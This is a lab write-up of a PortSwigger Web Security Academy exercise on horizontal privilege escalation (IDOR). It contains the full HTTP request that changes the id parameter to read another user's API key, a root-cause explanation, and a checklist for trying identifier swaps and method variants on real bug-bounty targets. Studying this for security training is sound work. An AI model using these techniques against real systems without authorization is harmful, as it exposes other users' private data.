# LAB: User ID controlled by request parameter

|                             |                                                                                                                                                |
| --------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------- |
| **Topic**                   | Access control (horizontal privilege escalation / IDOR)                                                                                        |
| **Difficulty**              | Apprentice                                                                                                                                     |
| **Date**                    | 2026-11-12                                                                                                                                     |
| **Time**                    | 2                                                                                                                                              |
| **Solved without solution** | yes                                                                                                                                            |
| **Link**                    | [lab-user-id-controlled-by-request-parameter](https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter) |

## 1. Objective

This lab has a horizontal privilege escalation vulnerability on the user account page.

To solve the lab, obtain the API key for the user carlos and submit it as the solution.

You can log in to your own account using the following credentials: wiener:peter.

## 2. Surface

`GET /my-account?id=wiener` — the user identity is carried by a request
parameter, not by the session.

## 3. Hypothesis

If the server trusts the `id` parameter to decide whose account to render,
changing the value to another user's identifier returns that user's account.

## 4. Payload that worked

Request

```http
GET /my-account?id=carlos HTTP/2
Host: 0ac90068038c29188180203300f900f4.web-security-academy.net
Cookie: session=3ahrm9NuyCqbYEokxfYldiPf9PWLacfh
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not:A-Brand";v="8", "Chromium";v="156"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://0ac90068038c29188180203300f900f4.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

Response

```
<p>Your username is: carlos</p>
<div>Your API Key is: soonFXYVG9OSwYdzetYoczqqwac4UUbe</div><br/>
```

## 5. Why it works

The session cookie authenticates me, but the server does not use it to decide
which account to render. It reads the `id` parameter from the query string and
treats it as the authoritative identity:

`SELECT ... FROM users WHERE username = '<id from request>'`

So the query is `GET /my-account?id=wiener` for me and `?id=carlos` for carlos —
the same endpoint, the same session, only the client-supplied value changes.
The server performs authentication (it knows I am logged in) but derives
authorization from client input, which is the definition of this bug class.

## 6. What I tried that failed

No failed payloads — the first swap worked. What made it fast was the order of
inspection:

- I logged in through the Burp browser with the proxy on, then read the
  **HTTP history** instead of the rendered page.
- The GET for the account page arrived with `?id=wiener` already in the URL,
  which told me the identity travelled as a parameter before I crafted anything.

Counter-check I expected to fail but didn't need: sending `/my-account` with no
`id` at all, and sending an `id` that does not exist. Both would tell me whether
the server falls back to the session (secure) or errors out (trusts the param).

## 7. In a real target (bounty translation)

- Every endpoint carrying an identifier is a candidate: `/api/orders/123`,
  `?user_id=`, `?invoiceId=`, body JSON `{"id":n}`, cookies, GraphQL `user(id:)`.
- Always create **two accounts**; swap identifiers in both directions.
- Try method changes too: if `GET /orders/123` blocks, try `PUT/DELETE/PATCH`.
- Impact: exposing or modifying another user's data → High (PII/financial → High/Critical).
- In the report: both requests side by side, response showing the other user's data.

## 8. Bypass / variants noticed

- Identifier numbering: test the same value minus/plus one, and other known
  usernames, to distinguish a real lookup from a broken one.
- Channel variants: the same identifier often works in POST body, JSON
  (`{"id":...}`), cookie and header on sibling endpoints.
- Method variants: if GET is validated, try `PUT`/`PATCH`/`DELETE` on the same
  object path — authorization is frequently implemented per-method.

## 9. Takeaway

When identity comes from a request parameter instead of the session, swapping
the parameter is immediate horizontal takeover. Two accounts, always.
